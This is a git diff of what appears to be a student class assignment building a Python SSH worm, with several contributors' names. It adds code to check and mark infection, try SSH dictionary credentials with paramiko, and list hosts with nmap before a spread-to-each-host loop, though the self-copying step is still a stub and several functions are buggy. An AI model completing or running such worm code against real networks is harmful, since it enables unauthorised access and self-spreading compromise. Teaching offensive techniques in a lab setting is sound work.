@@ -4,11 +4,14 @@ import socket
 import paramiko
 import nmap
 import netinfo
-import netifaces
+# import netifaces
 import socket
 import fcntl
 import struct
+import os.path
+from netifaces import interfaces, ifaddresses, AF_INET
 
+nmScan = nmap.PortScanner()
 
 # The list of credentials to attempt
 credList = [
@@ -34,8 +37,21 @@ def isInfectedSystem():
 	# infected.txt in directory /tmp (which
 	# you created when you marked the system
 	# as infected). 
-	pass
 
+	#Yu
+	# Go to /tmp folder?
+	# read infected.txt
+	# if infected.txt exists
+	#	returns 1 to signify infected
+	# else
+	#	returns 0 to signify not infected
+	#/Yu
+	# kevin
+	if os.path.exists(INFECTED_MARKER_FILE):
+		return 1
+	else:
+		return 0
+	# /kevin
 #################################################################
 # Marks the system as infected
 #################################################################
@@ -46,6 +62,17 @@ def markInfected():
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
+	
+	# yu
+	# infectedTracker = isInfectedSystem()
+	# if not infected	add infected.txt into the to mark infected /tmp/ directory
+	# /yu
+	if isInfectedSystem()==0:
+		# kevin
+		f = open(INFECTED_MARKER_FILE, "a")
+		f.write("filler text")
+		f.close()
+		# /kevin
 	pass	
 
 ###############################################################
@@ -63,10 +90,13 @@ def spreadAndExecute(sshClient):
 	# its permissions to executable, and
 	# execute itself. Please check out the
 	# code we used for an in-class exercise.
-	# The code which goes into this function
-	# is very similar to that code.	
-	pass
+	# The code which goes into this 
 
+	# infectedTracker = isInfectedSystem()
+	# function
+				#	# is very similar to that code.	
+	pass
+					#
 
 ############################################################
 # Try to connect to the given host given the existing
@@ -100,7 +130,20 @@ def tryCredentials(host, userName, password, sshClient):
 	# in the comments above the function
 	# declaration (if you choose to use
 	# this skeleton).
-	pass
+
+	#Desirae Prather
+	try:
+		sshClient.connect(host, username=userName, password=password)
+	except socket.error:
+		print("Error: Host is unreachable")
+		return 3
+	except paramiko.SSHException:
+		print("Error: Inccorrect credentials. Failed to establsh SSH connection.")
+		return 1
+
+	
+	return 0
+
 
 ###############################################################
 # Wages a dictionary attack against the host
@@ -137,10 +180,15 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		pass	
+
+		#Desirae Prather
+		if tryCredentials(host=host,userName=username,password=password,sshClient=ssh) == 0:
+			print("Found and instance of the SSH connection")
+			return (ssh.connect(host, username=username, password=password))
+		#	/Desirae Prather
 			
 	# Could not find working credentials
-	return None	
+	return (None)	
 
 ####################################################
 # Returns the IP of the current system
@@ -152,7 +200,23 @@ def getMyIP(interface):
 	
 	# TODO: Change this to retrieve and
 	# return the IP of the current system.
+	
+	# run a loop to print all the found result about the ports
+	# kevin
+	ip_list = []
+	for interface in interfaces():
+		try:
+			for link in ifaddresses(interface)[AF_INET]:
+				ip_list.append(link['addr'])
+				print(ip_list)
+		
+		except KeyError:
+			print("(exception caught) there was an error that i'm ignoring lol")
+	# /kevin
+		# print('the host : %s (%s)' % (host, nmScan[host].hostname()))
+		# the output in the GNS3 Topology thing is ('127.0.0.1','192.168.1.2'), always
 	return None
+
 
 #######################################################
 # Returns the list of systems on the same network
@@ -164,6 +228,16 @@ def getHostsOnTheSameNetwork():
 	# for hosts on the same network
 	# and return the list of discovered
 	# IP addresses.	
+	
+	for host in nmScan.all_hosts():
+		print('the host : %s (%s)' % (host, nmScan[host].hostname()))
+		print('state : %s' % nmScan[host].state())
+		for proto in nmScan[host].all_protocols():
+			print('Protocol : %s' % proto)
+			lport = nmScan[host][proto].keys()
+			# lport.sort()
+			for port in lport:
+				print ('pOrt : %s\tstate : %s' % (port, nmScan[host][proto][port]['state']))
 	pass
 
 # If we are being run without a command line parameters, 
@@ -191,7 +265,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # from the list of discovered systems (we
 # do not want to target ourselves!).
 
-print "Found hosts: ", networkHosts
+print("Found hosts: ", networkHosts)
 
 
 # Go through the network hosts
@@ -200,17 +274,17 @@ for host in networkHosts:
 	# Try to attack this host
 	sshInfo =  attackSystem(host)
 	
-	print sshInfo
+	print(sshInfo)
 	
 	
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread"
+		print("Trying to spread")
 		
 		# Infect that system
 		spreadAndExecute(sshInfo[0])
 		
-		print "Spreading complete"	
+		print("Spreading complete")
 	
 
